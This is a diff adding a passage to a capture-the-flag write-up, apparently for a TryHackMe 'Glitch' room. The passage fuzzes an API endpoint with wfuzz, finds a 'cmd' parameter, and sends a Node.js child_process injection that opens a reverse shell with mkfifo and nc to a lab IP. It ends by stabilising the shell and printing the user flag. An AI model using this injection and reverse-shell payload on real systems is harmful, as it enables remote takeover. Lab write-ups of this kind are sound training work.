@@ -43,3 +43,37 @@ We see that while trying to send a post request to /api/items we get this messag
 ```py
 {"message":"there_is_a_glitch_in_the_matrix"}
 ```
+
+Since,we are able to send POST requests.Let us search which parameters are available with wfuzz.
+
+```wfuzz -XPOST -u http://ip/api/items?FUZZ=id -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt --hh 45```
+
+![](/images/glitch.png)
+
+Thus, we see that Cmd is available.
+
+Now,we fire up burp and send a random request with cmd and it's working.
+
+![](/images/glitch2.png)
+
+Now,I started searching for the payload and I found one
+
+```require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.4.53 4444 >/tmp/f")```
+
+I changed the ip,encoded in URl form and POST this one.
+And,it worked.
+
+![](/images/glitch4.png)
+
+Listening to the PORT we have the shell.
+
+we stabilise our shell then with,
+
+```python -c 'import pty;pty.spawn("/bin/bash")'```
+
+Looking in the directories we get our user flag.
+
+![](/images/glitch5.png)
+
+Here's our user flag:****THM{i_don't_know_why}****
+
